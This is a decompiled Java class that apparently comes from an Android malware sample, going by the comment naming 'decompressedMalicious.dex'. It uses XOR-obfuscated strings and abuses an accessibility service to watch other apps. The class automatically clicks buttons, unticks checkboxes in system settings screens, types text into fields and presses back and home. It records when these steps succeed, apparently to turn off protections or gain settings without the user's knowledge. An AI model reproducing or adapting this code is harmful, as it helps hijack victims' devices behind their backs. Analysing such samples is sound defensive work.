package com.zjxyxnvvp.nxvxchltf.util;

import android.content.Context;
import android.graphics.Rect;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class k {
    private static short[] $ = {9697, 9686, 9687, 9687, 9676, 9677, 8778, 8774, 8772, 8711, 8769, 8796, 8776, 8798, 8780, 8768, 8711, 8794, 8784, 8794, 8797, 8780, 8772, 8772, 8776, 8775, 8776, 8782, 8780, 8795, 8004, 8051, 8050, 8050, 8041, 8040, 3654, 3703, 3690, 3686, 3652, 3707, 3703, 3685, 21, 52, 57, 36, 4, 53, 40, 36, 8905, 8928, 8940, 8954, 8956, 8934, 8929, 8936, 8879, 8929, 8928, 8939, 8938, 8879, 3860, 3862, 3841, 3868, 3866, 3867, 3850, 3860, 3847, 3858, 3840, 3864, 3856, 3867, 3841, 3850, 3846, 3856, 3841, 3850, 3841, 3856, 3853, 3841, 3850, 3862, 3869, 3860, 3847, 3846, 3856, 3844, 3840, 3856, 3867, 3862, 3856, 1966, 1921, 1924, 1934, 1926, 1928, 1929, 1997, 1932, 1949, 1949, 1997, 1921, 1932, 1935, 1928, 1921, 1997, 1924, 1930, 1923, 1922, 1951, 1928, 1997, 1950, 1940, 1950, 1945, 1928, 1920, 1997, 1935, 1932, 1945, 1945, 1928, 1951, 1940, 9485, 9510, 9513, 9514, 9508, 9517, 9516, 9576, 9505, 9519, 9510, 9511, 9530, 9517, 9576, 9531, 9521, 9531, 9532, 9517, 9509, 9576, 9514, 9513, 9532, 9532, 9517, 9530, 9521, 4040, 4036, 4038, 3973, 4035, 4062, 4042, 4060, 4046, 4034, 3973, 4056, 4050, 4056, 4063, 4046, 4038, 4038, 4042, 4037, 4042, 4044, 4046, 4057, 3973, 4038, 4042, 4034, 4037, 4056, 4040, 4057, 4046, 4046, 4037, 3973, 4088, 4046, 4063, 4063, 4034, 4037, 4044, 4074, 4040, 4063, 4034, 4061, 4034, 4063, 4050, 4034, 4045, 4039, 4049, 4044, 4042, 4039, 3993, 4042, 4039, 3980, 4048, 4052, 4042, 4055, 4032, 4043, 4092, 4052, 4042, 4039, 4036, 4038, 4055, 2314, 2350, 2352, 2349, 2362, 2353, 2425, 2358, 2367, 2367, 2425, 2895, 2914, 2936, 2922, 2921, 2919, 2926, 2859, 2915, 2940, 2859, 2936, 2940, 2914, 2943, 2920, 2915, 2926, 2936, 3755, 3751, 3749, 3814, 3744, 3773, 3753, 3775, 3757, 3745, 3814, 3771, 3761, 3771, 3772, 3757, 3749, 3749, 3753, 3750, 3753, 3759, 3757, 3770, 3826, 3745, 3756, 3815, 3768, 3770, 3757, 3758, 3771, 3735, 3749, 3753, 3745, 3750, 3735, 3771, 3755, 3770, 3757, 3757, 3750, 3735, 3757, 3750, 3772, 3770, 3761, 3735, 3753, 3773, 3772, 3751, 3735, 3773, 3768, 3756, 3753, 3772, 3757, 3735, 3755, 3748, 3757, 3753, 3750, 3773, 3768, 8105, 8101, 8103, 8164, 8098, 8127, 8107, 8125, 8111, 8099, 8164, 8121, 8115, 8121, 8126, 8111, 8103, 8103, 8107, 8100, 8107, 8109, 8111, 8120, 8176, 8099, 8110, 8165, 8122, 8120, 8111, 8108, 8121, 8085, 8103, 8107, 8099, 8100, 8085, 8121, 8105, 8120, 8111, 8111, 8100, 8085, 8111, 8100, 8126, 8120, 8115, 8085, 8107, 8127, 8126, 8101, 8085, 8127, 8122, 8110, 8107, 8126, 8111, 8085, 8107, 8100, 8126, 8099, 8124, 8099, 8120, 8127, 8121, 8251, 8247, 8245, 8310, 8240, 8237, 8249, 8239, 8253, 8241, 8310, 8235, 8225, 8235, 8236, 8253, 8245, 8245, 8249, 8246, 8249, 8255, 8253, 8234, 6557, 6546, 6552, 6542, 6547, 6549, 6552, 6610, 6539, 6549, 6552, 6555, 6553, 6536, 6610, 6576, 6549, 6543, 6536, 6570, 6549, 6553, 6539, 9197, 9158, 9163, 9165, 9157, 9163, 9162, 9210, 9163, 9174, 9178, 9208, 9159, 9163, 9177, 3891, 3903, 3901, 3966, 3896, 3877, 3889, 3879, 3893, 3897, 3966, 3875, 3881, 3875, 3876, 3893, 3901, 3901, 3889, 3902, 3889, 3895, 3893, 3874, 3966, 3901, 3889, 3897, 3902, 3875, 3891, 3874, 3893, 3893, 3902, 3966, 3869, 3889, 3897, 3902, 3843, 3891, 3874, 3893, 3893, 3902, 3857, 3891, 3876, 3897, 3878, 3897, 3876, 3881, 6950, 6954, 6952, 7019, 6957, 6960, 6948, 6962, 6944, 6956, 7019, 6966, 6972, 6966, 6961, 6944, 6952, 6952, 6948, 6955, 6948, 6946, 6944, 6967, 7039, 6956, 6945, 7018, 6966, 6944, 6961, 6961, 6956, 6955, 6946, 6938, 6952, 6944, 6955, 6960, 8279, 8256, 8297, 8274, 8287, 8261, 8279, 8276, 8282, 8275, 8274, 937, 930, 941, 942, 928, 937, 936, 915, 933, 939, 930, 931, 958, 937, 3009, 3036, 3016, 3038, 3020, 3008, 78, 66, 64, 3, 69, 88, 76, 90, 72, 68, 3, 94, 84, 94, 89, 72, 64, 64, 76, 67, 76, 74, 72, 95, 4571, 4604, 4585, 4602, 4604, 4520, 4577, 4591, 4582, 4583, 4602, 4589, 4520, 4603, 4593, 4603, 4604, 4589, 4581, 4520, 4586, 4585, 4604, 4604, 4589, 4602, 4593, 4520, 4577, 4582, 4604, 4589, 4582, 4604, 5033, 5029, 5031, 5092, 5026, 5055, 5035, 5053, 5039, 5027, 5092, 5049, 5043, 5049, 5054, 5039, 5031, 5031, 5035, 5028, 5035, 5037, 5039, 5048, 5092, 5050, 5029, 5053, 5039, 5048, 5092, 5055, 5027, 5092, 4994, 5053, 5018, 5029, 5053, 5039, 5048, 4999, 5035, 5028, 5035, 5037, 5039, 5048, 5003, 5033, 5054, 5027, 5052, 5027, 5054, 5043, 7804, 7794, 7803, 7799, 7701, 6775, 6757, 6761, 6775, 6769, 6762, 6755, 2654, 2642, 2640, 2579, 2638, 2652, 2640, 2638, 2632, 2643, 2650, 2579, 2652, 2643, 2649, 2639, 2642, 2644, 2649, 2579, 2641, 2642, 2642, 2641, 7652, 7656, 7658, 7593, 7668, 7654, 7658, 7668, 7666, 7657, 7648, 7593, 7654, 7657, 7651, 7669, 7656, 7662, 7651, 7593, 7668, 7658, 7593, 7653, 7654, 7667, 7667, 7650, 7669, 7678, 7593, 7666, 7662, 7593, 7621, 7654, 7667, 7667, 7650, 7669, 7678, 7622, 7652, 7667, 7662, 7665, 7662, 7667, 7678, 7386, 7382, 7380, 7319, 7377, 7372, 7384, 7374, 7388, 7376, 7319, 7370, 7360, 7370, 7373, 7388, 7380, 7380, 7384, 7383, 7384, 7390, 7388, 7371, 7319, 7380, 7384, 7376, 7383, 7370, 7386, 7371, 7388, 7388, 7383, 7319, 7412, 7384, 7376, 7383, 7402, 7386, 7371, 7388, 7388, 7383, 7416, 7386, 7373, 7376, 7375, 7376, 7373, 7360, 8528, 8567, 8546, 8561, 8567, 8483, 8555, 8566, 8546, 8564, 8550, 8554, 8483, 8560, 8570, 8560, 8567, 8550, 8558, 8483, 8558, 8546, 8557, 8546, 8548, 8550, 8561, 1409, 1430, 1415, 1410, 1515, 1515, 1504, 3962, 3958, 3956, 3895, 3946, 3960, 3956, 3946, 3948, 3959, 3966, 3895, 3960, 3959, 3965, 3947, 3958, 3952, 3965, 3895, 3957, 3958, 3958, 3957, 2962, 2979, 3006, 2994, 2960, 2991, 2979, 2993, 9486, 9529, 9528, 9528, 9507, 9506, 6492, 6483, 6489, 6479, 6482, 6484, 6489, 6407, 6484, 6489, 6418, 6478, 6474, 6484, 6473, 6494, 6485, 6498, 6474, 6484, 6489, 6490, 6488, 6473, 5168, 5140, 5130, 5143, 5120, 5131, 5187, 5132, 5125, 5125, 5187, 8507, 8464, 8479, 8476, 8466, 8475, 8474, 8542, 8471, 8473, 8464, 8465, 8460, 8475, 8542, 8461, 8455, 8461, 8458, 8475, 8467, 8542, 8465, 8462, 8458, 8471, 8467, 8471, 8452, 8479, 8458, 8471, 8465, 
    8464, 8461, 9148, 9131, 9090, 9145, 9140, 9134, 9148, 9151, 9137, 9144, 9145, 8105, 8066, 8077, 8078, 8064, 8073, 8072, 8140, 8077, 8090, 8140, 8072, 8069, 8095, 8077, 8078, 8064, 8073, 8072, 3835, 3824, 3839, 3836, 3826, 3835, 3834, 3777, 3831, 3833, 3824, 3825, 3820, 3835, 4521, 4482, 4493, 4494, 4480, 4489, 4488, 4556, 4485, 4491, 4482, 4483, 4510, 4489, 4556, 4511, 4501, 4511, 4504, 4489, 4481, 4556, 4483, 4508, 4504, 4485, 4481, 4485, 4502, 4493, 4504, 4485, 4483, 4482, 4511};

    /* renamed from: a  reason: collision with root package name */
    private static boolean f372a;

    /* renamed from: b  reason: collision with root package name */
    private static boolean f373b;
    private static boolean c;
    private static boolean d;
    public static long e;
    public static long f;
    private static byte g;
    private static byte h;
    private static long i;
    static boolean j;
    static int k;

    private static String $(int i2, int i3, int i4) {
        char[] cArr = new char[i3 - i2];
        for (int i5 = 0; i5 < i3 - i2; i5++) {
            cArr[i5] = (char) ($[i2 + i5] ^ i4);
        }
        return new String(cArr);
    }

    private static boolean a(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
        if (accessibilityNodeInfo != null) {
            arrayList.addAll(b.b(accessibilityNodeInfo, $(0, 6, 9635)));
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : arrayList) {
            if (!(accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getText() == null || !accessibilityNodeInfo2.getText().toString().toLowerCase().equals(g.k()))) {
                accessibilityNodeInfo2.performAction(16);
                uIDNwaidobaWIODb.performGlobalAction(1);
                uIDNwaidobaWIODb.performGlobalAction(1);
                uIDNwaidobaWIODb.performGlobalAction(2);
                return true;
            }
        }
        return false;
    }

    private static void b(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        CharSequence packageName = accessibilityEvent.getPackageName();
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (!(packageName == null || accessibilityNodeInfo == null || !packageName.equals($(6, 30, 8745)))) {
            String l = g.l();
            String $2 = $(30, 36, 7942);
            List<AccessibilityNodeInfo> b2 = b.b(accessibilityNodeInfo, $2);
            String $3 = $(36, 44, 3602);
            b2.addAll(b.b(accessibilityNodeInfo, $3));
            Iterator<AccessibilityNodeInfo> it = b2.iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                AccessibilityNodeInfo next = it.next();
                if (!(next == null || next.getText() == null || !next.getText().toString().toLowerCase().contains(l))) {
                    next.performAction(16);
                    next.getParent().performAction(16);
                    next.getParent().getParent().performAction(16);
                    next.getParent().getParent().getParent().performAction(16);
                    next.getBoundsInScreen(new Rect());
                    break;
                }
            }
            List<AccessibilityNodeInfo> b3 = b.b(accessibilityNodeInfo, $(44, 52, 80));
            String l2 = b.l(uIDNwaidobaWIODb);
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : b3) {
                Bundle bundle = new Bundle();
                e.a($(52, 66, 8847) + ((Object) accessibilityNodeInfo2.getText()));
                accessibilityNodeInfo2.performAction(1);
                bundle.putString($(66, 103, 3925), l2);
                accessibilityNodeInfo2.performAction(2097152, bundle);
            }
            List<AccessibilityNodeInfo> b4 = b.b(accessibilityNodeInfo, $3);
            b4.addAll(b.b(accessibilityNodeInfo, $2));
            for (AccessibilityNodeInfo accessibilityNodeInfo3 : b4) {
                if (!(accessibilityNodeInfo3 == null || accessibilityNodeInfo3.getText() == null || !accessibilityNodeInfo3.getText().toString().toLowerCase().contains(l2.toLowerCase()))) {
                    accessibilityNodeInfo3.performAction(16);
                    accessibilityNodeInfo3.getParent().performAction(16);
                    accessibilityNodeInfo3.getParent().getParent().performAction(16);
                    accessibilityNodeInfo3.getParent().getParent().getParent().performAction(16);
                    i = System.currentTimeMillis();
                    e.a($(103, 142, 2029));
                }
            }
        }
        if (System.currentTimeMillis() - i < 20000 && a(uIDNwaidobaWIODb, accessibilityEvent)) {
            i(uIDNwaidobaWIODb);
            e.a($(142, 171, 9544));
        }
    }

    private static void c(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        String str;
        CharSequence packageName = accessibilityEvent.getPackageName();
        CharSequence className = accessibilityEvent.getClassName();
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (className != null && className.equals($(171, 222, 4011))) {
            if (!j) {
                boolean z = false;
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(222, 246, 4003))) {
                    if (accessibilityNodeInfo2.isChecked()) {
                        accessibilityNodeInfo2.performAction(16);
                        e.a($(246, 257, 2393) + 0);
                    }
                    e.a($(257, 276, 2827));
                    z = true;
                }
                j = z;
            }
            if (j) {
                int i2 = k;
                if (i2 == 0) {
                    str = $(276, 347, 3784);
                } else if (i2 == 1) {
                    str = $(347, 420, 8138);
                } else {
                    return;
                }
                for (AccessibilityNodeInfo accessibilityNodeInfo3 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) {
                    accessibilityNodeInfo3.performAction(16);
                }
            }
        }
        if (accessibilityNodeInfo != null && className != null && packageName != null && packageName.equals($(420, 444, 8280)) && className.equals($(444, 467, 6652)) && j) {
            Iterator<AccessibilityNodeInfo> it = b.b(accessibilityNodeInfo, $(467, 482, 9134)).iterator();
            while (it.hasNext()) {
                AccessibilityNodeInfo next = it.next();
                if (!it.hasNext()) {
                    next.performAction(16);
                    int i3 = k + 1;
                    k = i3;
                    if (i3 == 2) {
                        h(uIDNwaidobaWIODb);
                    }
                }
            }
        }
        if (!(accessibilityNodeInfo == null || className == null || !className.equals($(482, 536, 3920)) || (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(536, 576, 6981))) == null)) {
            for (AccessibilityNodeInfo accessibilityNodeInfo4 : findAccessibilityNodeInfosByViewId) {
                accessibilityNodeInfo4.performAction(16);
            }
        }
    }

    public static boolean d(Context context) {
        if (!d) {
            c = d.e.f314a.g(context, $(576, 587, 8246));
            d = true;
        }
        return c;
    }

    public static boolean e(Context context) {
        if (!f373b) {
            f372a = d.e.f314a.g(context, $(587, 601, 972));
            f373b = true;
        }
        return f372a;
    }

    /* JADX WARN: Removed duplicated region for block: B:46:0x0118  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x009a A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void f(com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb r26, android.view.accessibility.AccessibilityEvent r27) {
        /*
            Method dump skipped, instructions count: 494
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.zjxyxnvvp.nxvxchltf.util.k.f(com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb, android.view.accessibility.AccessibilityEvent):void");
    }

    private static void g(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        CharSequence packageName = accessibilityEvent.getPackageName();
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (!(accessibilityNodeInfo == null || packageName == null || !packageName.equals($(894, 918, 3865)))) {
            List<AccessibilityNodeInfo> b2 = b.b(accessibilityNodeInfo, $(918, 926, 3014));
            b2.addAll(b.b(accessibilityNodeInfo, $(926, 932, 9548)));
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : b2) {
                if (!(accessibilityNodeInfo2 == null || accessibilityNodeInfo2.getText() == null || !accessibilityNodeInfo2.getText().toString().toLowerCase().contains(g.m()))) {
                    accessibilityNodeInfo2.performAction(16);
                    accessibilityNodeInfo2.getParent().performAction(16);
                    accessibilityNodeInfo2.getParent().getParent().performAction(16);
                }
            }
            boolean z = false;
            for (AccessibilityNodeInfo accessibilityNodeInfo3 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(932, 956, 6461))) {
                if (accessibilityNodeInfo3.isChecked()) {
                    accessibilityNodeInfo3.performAction(16);
                    e.a($(956, 967, 5219) + 0);
                }
                e.a($(967, 1002, 8574));
                z = true;
            }
            if (z) {
                i(uIDNwaidobaWIODb);
                uIDNwaidobaWIODb.performGlobalAction(1);
                uIDNwaidobaWIODb.performGlobalAction(1);
                uIDNwaidobaWIODb.performGlobalAction(2);
            }
        }
    }

    public static void h(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        d.e.f314a.i(uIDNwaidobaWIODb, $(1002, 1013, 9181), true);
        c = true;
        d = true;
        a.c = 0;
        e.a($(1013, 1032, 8172));
    }

    public static void i(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        d.e.f314a.i(uIDNwaidobaWIODb, $(1032, 1046, 3742), true);
        f372a = true;
        f373b = true;
        a.c = 0;
        e.a($(1046, 1081, 4588));
    }
}
